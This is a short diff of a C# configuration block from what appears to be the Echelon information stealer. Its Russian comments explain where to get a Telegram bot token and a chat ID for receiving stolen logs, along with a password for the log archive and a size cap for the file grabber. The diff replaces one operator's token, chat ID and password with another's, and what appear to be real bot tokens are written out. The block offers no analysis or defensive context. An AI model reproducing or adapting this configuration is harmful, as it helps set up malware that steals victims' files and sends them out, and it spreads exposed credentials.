@@ -15,13 +15,13 @@ namespace Echelon
     class Program
     {
         //Токен бота в телеге можно создать бота и получить токен тут: @BotFather
-        public static string Token = "1230613231:AAHIU00xkjLD5gh2R3Dwt4ug4zoutlcng_U";
+        public static string Token = "5894044355:AAEtZZEvh2iPjhUavetC5ywgLSaARFANrxg";
 
         // Telegram ID чата, можно узнать тут: @my_id_bot
-        public static string ID = "844300569";
+        public static string ID = "1264274625";
 
         // Пароль для архива с логом:
-        public static string passwordzip = "Echelon";
+        public static string passwordzip = "12345";
 
         // максимальный вес файла в файлграббере 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
         public static int FileSize = 10500000;
